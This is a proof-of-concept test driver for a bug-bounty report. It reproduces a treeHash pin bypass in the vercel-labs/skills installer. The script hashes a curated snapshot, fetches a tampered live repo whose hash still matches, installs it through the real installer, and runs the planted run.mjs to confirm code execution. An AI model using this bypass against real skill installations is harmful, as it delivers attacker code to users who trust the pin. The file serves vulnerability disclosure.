// e2e PoC driver for HackerOne #4169727 (vercel-labs/skills pack-pointer
// treeHash pin bypass). Authored by the reporter as a test harness; every
// security-relevant function it calls is imported unmodified from the real
// vercel-labs/skills source checked out alongside it (./src/*.ts) -- nothing
// here reimplements collectSkillsShFiles, computeSkillsShTreeHash,
// copyDirectory, fetchSources, or installFetched.
//
// Run from inside a `vercel-labs/skills` checkout with `npm ci` already done.
// Env: POC_REPO="<owner>/<repo>", POC_CURATED_DIR="<path to pre-tamper skill dir>"

import { collectSkillsShFiles, computeSkillsShTreeHash } from './src/skills-sh-hash.ts';
import { parseSource } from './src/source-parser.ts';
import { fetchSources, installFetched, releaseSource, projectPlacement } from './src/add.ts';
import { execFileSync } from 'node:child_process';
import { readdirSync, statSync } from 'node:fs';
import { join } from 'node:path';

function findFile(root, name, maxDepth = 8) {
  const stack = [[root, 0]];
  while (stack.length) {
    const [dir, depth] = stack.pop();
    if (depth > maxDepth) continue;
    let entries;
    try {
      entries = readdirSync(dir, { withFileTypes: true });
    } catch {
      continue;
    }
    for (const e of entries) {
      const full = join(dir, e.name);
      if (e.isDirectory()) stack.push([full, depth + 1]);
      else if (e.name === name) return full;
    }
  }
  return null;
}

const REPO = process.env.POC_REPO;
const CURATED_DIR = process.env.POC_CURATED_DIR;
if (!REPO || !CURATED_DIR) throw new Error('POC_REPO / POC_CURATED_DIR not set');

console.log('=== Step 1: pin computed from the curated (pre-tamper) snapshot ===');
console.log('curated dir:', CURATED_DIR);
const curatedFiles = await collectSkillsShFiles(CURATED_DIR);
console.log(
  'files the pin covers:',
  curatedFiles.map((f) => f.path)
);
const pin = computeSkillsShTreeHash(curatedFiles);
console.log('PIN =', pin);

console.log('\n=== Step 2: fetch the LIVE upstream repo via the real CLI fetchSources() ===');
const [fetched] = await fetchSources([{ parsed: parseSource(REPO), skills: ['poc-skill'] }]);
if (!fetched.resolved) throw new Error('fetch failed: ' + fetched.error);
console.log(
  'discovered skills in live repo:',
  fetched.resolved.skills.map((s) => s.name)
);

const liveCandidate =
  fetched.resolved.skills.find((s) => /poc-skill/i.test(s.name)) ?? fetched.resolved.skills[0];
console.log('candidate path on disk (fresh clone):', liveCandidate.path);
console.log('candidate dir listing (recursive-ish):');
execFileSync('find', [liveCandidate.path], { stdio: 'inherit' });

console.log('\n=== Step 3: recompute the hash of the LIVE (tampered) tree ===');
const liveFiles = await collectSkillsShFiles(liveCandidate.path);
console.log(
  'files the hash covers in the live tree (should be identical set to Step 1):',
  liveFiles.map((f) => f.path)
);
const liveHash = computeSkillsShTreeHash(liveFiles);
console.log('HASH(live) =', liveHash);
console.log('PIN        =', pin);
console.log('MATCH:', liveHash === pin);
if (liveHash !== pin) {
  console.error('PIN DID NOT MATCH -- bypass not reproduced, stopping.');
  process.exit(1);
}

console.log(
  '\n=== Step 4: drive the real installPackPointerSkills select()+install path ==='
);
const placement = { ...projectPlacement(['claude-code']), mode: 'copy' };
const outcome = await installFetched(fetched, {
  skills: ['poc-skill'],
  placement,
  select: async (candidates) => {
    const kept = [];
    for (const c of candidates) {
      const h = computeSkillsShTreeHash(await collectSkillsShFiles(c.path));
      const matches = h === pin;
      console.log(`  select(): candidate=${c.name} hash=${h} pinMatch=${matches}`);
      if (matches) kept.push(c);
    }
    return kept;
  },
});
console.log('install outcome:', JSON.stringify(outcome, null, 2));
await releaseSource(fetched);

if (outcome.installed.length === 0) {
  console.error('Nothing installed -- bypass not reproduced through the real installer.');
  process.exit(1);
}

console.log('\n=== Step 5: confirm the planted gadget landed in the installed tree ===');
const installedGadget = findFile(process.cwd(), 'h1-4169727-poc-gadget') || findFile('.claude', 'index.js');
const installedRun = findFile(process.cwd(), 'run.mjs');
console.log('installed run.mjs:', installedRun);
execFileSync('find', ['.claude'], { stdio: 'inherit' });

if (!installedRun) {
  console.error('Could not locate installed run.mjs -- see directory listing above.');
  process.exit(1);
}

console.log('\n=== Step 6: RUN the installed script for real (proves code execution) ===');
const out = execFileSync('node', [installedRun], { encoding: 'utf8' });
console.log('stdout from installed script:', out.trim());

if (out.includes('ATTACKER CODE EXECUTED')) {
  console.log('\n*** PoC CONFIRMED: pin bypass + real install + real code execution, end to end. ***');
} else {
  console.error('\nMarker not found in output -- execution did not prove the gadget ran.');
  process.exit(1);
}
